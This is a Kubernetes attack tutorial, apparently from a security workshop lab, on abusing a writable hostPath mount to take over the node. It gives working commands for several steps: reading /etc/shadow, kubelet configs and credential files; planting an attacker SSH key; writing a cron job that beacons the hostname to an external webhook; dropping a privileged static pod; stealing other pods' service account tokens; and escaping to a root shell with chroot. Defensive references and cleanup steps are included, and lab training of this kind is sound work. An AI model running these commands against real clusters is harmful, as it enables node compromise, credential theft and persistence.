# Writable hostPath Mount

An attacker who can create a pod with a writable `hostPath` volume gains direct read/write access to the underlying node's filesystem. This allows reading sensitive host files, writing SSH keys or cron jobs for persistence, and planting static pod manifests — all without any container escape exploit.

## Description

A `hostPath` volume mounts a file or directory from the node's filesystem directly into the pod. When the volume is writable and the container runs as root (or with `privileged: true`), the attacker effectively has root access to the node because:

- **Read sensitive files** — `/etc/shadow`, kubeconfig files, kubelet credentials, etcd data directories, cloud provider credentials cached on disk.
- **Write for persistence** — add SSH authorized keys, write a cron job to `/etc/cron.d/`, or drop a static pod manifest into `/etc/kubernetes/manifests/`.
- **Container escape via chroot** — `chroot /host /bin/bash` provides a full root shell in the host OS context.
- **Read other pods' data** — container layers and volumes for all pods on the node are accessible under `/var/lib/containerd/` or `/var/lib/docker/`.

This technique requires only standard Kubernetes pod creation — no kernel exploit or container runtime bug.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has obtained credentials that grant `create pods` in the target namespace, and the cluster lacks a policy (PodSecurity Admission, OPA/Gatekeeper, Kyverno) that blocks `hostPath` mounts or privileged containers.

## Quick Start

### Step 1 — Deploy the hostPath pod

The pod in `hostpath-pod.yaml` mounts three host paths:
- `/` mounted at `/host` (full root filesystem access)
- `/etc` mounted at `/host-etc` (direct config file access)
- `/tmp` mounted at `/host-tmp` (writable temp space)

```bash
kubectl apply -f hostpath-pod.yaml
```

Wait for the pod to start:

```bash
kubectl wait --for=condition=Ready pod/hostpath-writer --timeout=60s
```

### Step 2 — Read sensitive host files

Read the host's `/etc/shadow` to obtain password hashes for offline cracking:

```bash
kubectl exec hostpath-writer -- cat /host-etc/shadow
```

Expected output (Kind node):

```
root:*:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
...
```

Read kubelet credentials and PKI certificates:

```bash
kubectl exec hostpath-writer -- ls /host/etc/kubernetes/pki/ 2>/dev/null || \
  kubectl exec hostpath-writer -- ls /host/var/lib/kubelet/pki/
```

Read the kubeconfig used by the kubelet — this may contain cluster-admin credentials:

```bash
kubectl exec hostpath-writer -- cat /host/etc/kubernetes/kubelet.conf 2>/dev/null | head -30
```

Read cloud provider metadata credentials cached on disk (common on managed clusters):

```bash
kubectl exec hostpath-writer -- find /host/etc -name "*.json" -o -name "*.conf" | \
  xargs grep -l "token\|secret\|key\|credential" 2>/dev/null | head -10
```

### Step 3 — Write an SSH authorized key for persistent node access

Add an attacker-controlled public key to root's authorized_keys on the host:

```bash
# Replace with your actual public key
ATTACKER_PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com"

kubectl exec hostpath-writer -- sh -c "
  mkdir -p /host/root/.ssh
  chmod 700 /host/root/.ssh
  echo '$ATTACKER_PUBKEY' >> /host/root/.ssh/authorized_keys
  chmod 600 /host/root/.ssh/authorized_keys
  echo 'SSH key written'
"
```

Verify:

```bash
kubectl exec hostpath-writer -- cat /host/root/.ssh/authorized_keys
```

The attacker can now SSH directly into the node as root (if SSH is exposed), bypassing Kubernetes entirely.

### Step 4 — Write a host cron job for persistent code execution

Drop a cron job directly onto the host filesystem. This runs outside any Kubernetes context — deleting all pods does not affect it:

```bash
kubectl exec hostpath-writer -- sh -c "
cat > /host-etc/cron.d/beacon << 'EOF'
* * * * * root curl -sf https://webhook.site/YOUR_WEBHOOK_ID -d \"cron-beacon-\$(hostname)\" 2>/dev/null
EOF
chmod 644 /host-etc/cron.d/beacon
echo 'Host cron job written'
"
```

Verify the cron job exists on the host:

```bash
kubectl exec hostpath-writer -- cat /host-etc/cron.d/beacon
```

### Step 5 — Plant a static pod manifest for Kubernetes-level persistence

Combine writable hostPath with the static pods technique: write a pod manifest directly to the kubelet's static pod directory:

```bash
kubectl exec hostpath-writer -- sh -c "
cat > /host/etc/kubernetes/manifests/evil-static.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: evil-static
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  containers:
    - name: evil
      image: alpine:latest
      command: [\"/bin/sh\", \"-c\", \"sleep infinity\"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host
          mountPath: /host
  volumes:
    - name: host
      hostPath:
        path: /
EOF
echo 'Static pod manifest written'
"
```

Within seconds, the kubelet will create the static pod:

```bash
kubectl get pods -n kube-system | grep evil-static
```

### Step 6 — Read other pods' secrets from the container runtime data

All container data for pods on the same node is stored on the host filesystem. Access secrets mounted in other pods without needing `kubectl exec` on them:

```bash
# List all container overlay directories
kubectl exec hostpath-writer -- ls /host/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/ 2>/dev/null | head -10

# Find service account tokens mounted in other pod filesystems
kubectl exec hostpath-writer -- find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | head -10

# Read a token from another pod
TOKEN_PATH=$(kubectl exec hostpath-writer -- find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | head -1)
kubectl exec hostpath-writer -- cat $TOKEN_PATH
```

### Step 7 — Escape to the host with chroot

Use `chroot` to get a full root shell in the host OS context:

```bash
kubectl exec -it hostpath-writer -- chroot /host /bin/sh
```

From this shell you are operating as root on the underlying node OS, not inside a container. You can install software, modify system files, and interact with the host network stack directly.

```bash
# Inside the chroot shell:
id
uname -a
cat /etc/os-release
exit
```

## Cleanup

```bash
# Remove any planted static pod manifest
kubectl exec hostpath-writer -- rm -f /host/etc/kubernetes/manifests/evil-static.yaml

# Remove the host cron job
kubectl exec hostpath-writer -- rm -f /host-etc/cron.d/beacon

# Remove planted SSH key (edit the file to remove only the attacker key if others exist)
kubectl exec hostpath-writer -- rm -f /host/root/.ssh/authorized_keys

# Delete the hostPath pod
kubectl delete -f hostpath-pod.yaml
```

Verify cleanup:

```bash
kubectl get pod hostpath-writer
kubectl get pods -n kube-system | grep evil-static
```

## Resources

- [Kubernetes hostPath](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [MITRE ATT&CK for Containers — Writable hostPath Mount](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/)
